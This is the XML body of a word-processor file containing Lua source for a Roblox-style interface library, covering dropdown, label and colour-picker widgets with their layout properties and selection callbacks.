        <w:t xml:space="preserve">                multi_items = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ignore = options.ignore or false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                y_size;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                seperator = options.seperator or options.Seperator or false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            }   </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            cfg.default = options.default or (cfg.multi and {cfg.items[1]}) or cfg.items[1] or "None"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            flags[cfg.flag] = cfg.default</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items; do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- Element</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "dropdown_object"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self.items[ "elements" ];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Size = dim2(1,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"name"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rgb(245, 245, 245);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = cfg.name;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "dropdown_object" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, 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if cfg.info then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        items[ "info" ] = library:create( "TextLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            FontFace = fonts.small;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextColor3 = rgb(130, 130, 130);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextWrapped = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Text = cfg.info;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "dropdown_object" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Position = dim2(0, 5, 0, 17);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Size = dim2(1, -10, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextXAlignment = Enum.TextXAlignment.Left;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            AutomaticSize = Enum.AutomaticSize.XY;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextSize = 16;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundColor3 = rgb(255, 255, 255)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:create( "UIPadding" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "name" ];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"right_components" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "dropdown_object"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BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0,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FillDirection = Enum.FillDirection.Horizontal;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        HorizontalAlignment = Enum.HorizontalAlignment.Right;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "right_components"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"dropdown"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Parent = items[ "right_components"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Size = dim2(0, cfg.width, 0, 16);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rgb(33, 33, 35)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"dropdown"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"sub_text"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rgb(86, 86, 87);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = "awdawdawdawdawdawdawdaw";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "dropdown" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -12, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;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TextTruncate = Enum.TextTruncate.AtEnd;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        AutomaticSize = Enum.AutomaticSize.Y;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"sub_text" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingTop = dim(0, 1);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"indicator" ] = library:create( "ImageLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ImageColor3 = rgb(86, 86, 87);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "dropdown" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        AnchorPoint = vec2(1, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Image = "rbxassetid://101025591575185";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(1, -5, 0.5, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 12, 0, 12);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-- </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- Element Holder</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "dropdown_holder" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = library[ "items" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Visible = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ZIndex = 10;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"outline" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "dropdown_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, 0, 1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ClipsDescendants = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(33, 33, 35);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ZIndex = 10;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PaddingBottom = dim(0, 6);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingTop = dim(0, 3);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingLeft = dim(0, 3);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "outline"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"outline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Padding = dim(0, 5);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"outline"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-- </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.render_option(text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local button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text;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Size = dim2(1, -12,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255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ZIndex = 10;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }); library:apply_theme(button, "accent", "TextColor3");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button;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingTop = dim(0, 1);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return button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cfg.set_visible(bool)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local a = bool and cfg.y_size or 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "dropdown_holder" ], {Size = dim_offset(items[ "dropdown" ].AbsoluteSize.X, a)})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "dropdown_holder" ].Position = dim2(0, items[ "dropdown" ].AbsolutePosition.X, 0, items[ "dropdown" ].AbsolutePosition.Y + 80)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not (self.sanity and library.current_open == self) then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:close_element(cfg)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cfg.set(value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local selected = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local isTable = type(value) == "table"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _, option in cfg.option_instances do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if option.Text == value or (isTable and find(value, option.Text)) then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        insert(selected, option.Text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        cfg.multi_items = selected</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        option.TextColor3 = themes.preset.accent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        option.TextColor3 = rgb(72, 72, 73)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items[ "sub_text" ].Text = isTable and concat(selected, ", ") or selected[1] or ""</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flags[cfg.flag] = isTable and selected or selected[1]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.callback(flags[cfg.flag]) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.changetext(text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "name" ].Text = text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cfg.refresh_options(list) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.y_size = 0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _, option in cfg.option_instances do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    option:Destroy() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.option_instances = {} </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _, option in list do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local button = cfg.render_option(option)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.y_size += button.AbsoluteSize.Y + 6 -- super annoying manual sizing but oh well</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    insert(cfg.option_instances, button)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    button.MouseButton1Down:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if cfg.multi then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local selected_index = find(cfg.multi_items, button.Text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if selected_index then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                remove(cfg.multi_items, selected_index)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                insert(cfg.multi_items, button.Text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.set(cfg.multi_items) </w:t>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        else </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.set_visible(false)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.open = false </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.set(button.Text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end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items[ "dropdown" ].MouseButton1Click:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.open = not cfg.open </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.set_visible(cfg.open)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if cfg.seperator then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flags[cfg.flag] = {} </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            config_flags[cfg.flag] = cfg.set</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            cfg.refresh_options(cfg.options)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            cfg.set(cfg.default)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return setmetatable(cfg, library)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:label(options)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                enabled = options.enabled or nil,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = options.name or "Toggle",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                wrapped = options.wrapped or false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                seperator = options.seperator or options.Seperator or false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                info = options.info or nil; </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};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items[ "label"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TextWrapped = cfg.wrapped,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "label"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RichText = true,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/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if cfg.info then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "info"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rgb(130, 130, 130);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextWrapped = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = cfg.info;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "label" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 5, 0, 17);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -10,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"label" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(1, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 0, 1, 0);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FillDirection = Enum.FillDirection.Horizontal;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    HorizontalAlignment = Enum.HorizontalAlignment.Right;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Padding = dim(0, 9);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SortOrder = Enum.SortOrder.LayoutOrder</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if cfg.seperator then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function cfg.set(text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "name" ].Text = text</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end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library:colorpicker(options) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = options.name or "Color", </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flag = options.flag or library:next_flag(),</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                color = options.color or color(1, 1, 1), -- Default to white color if not provided</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                alpha = options.alpha and 1 - options.alpha or 0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                open = false, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = options.callback or function() end,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                seperator = options.seperator or options.Seperator or false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local dragging_sat = false </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local dragging_hue = false </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local dragging_alpha = false </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local h, s, v = cfg.color:ToHSV() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local a = cfg.alpha </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            flags[cfg.flag] = {Color = cfg.color, Transparency = cfg.alpha}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local label; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not self.items.right_components then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                label = self:label({name = cfg.name, seperator = cfg.seperator})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items; do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- Component</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "colorpicker"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Parent = label and label.items.right_components or self.items[ "right_components"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Size = dim2(0, 16, 0, 16);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rgb(54, 31, 184)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"colorpicker"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"colorpicker_inline" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "colorpicker" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -2, 1, -2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderMode = Enum.BorderMode.Inset;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 1, 0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(54, 31, 184)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"colorpicker_inline"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rgb(211, 211, 211)), rgbkey(1, rgb(211, 211, 211))};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "colorpicker_inline" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });         </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- Colorpicker</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "colorpicker_holder" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = library[ "other" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0.20000000298023224, 20, 0.296999990940094, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 166, 0, 197);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Visible = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(25, 25, 29)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "colorpicker_fade" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "colorpicker_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
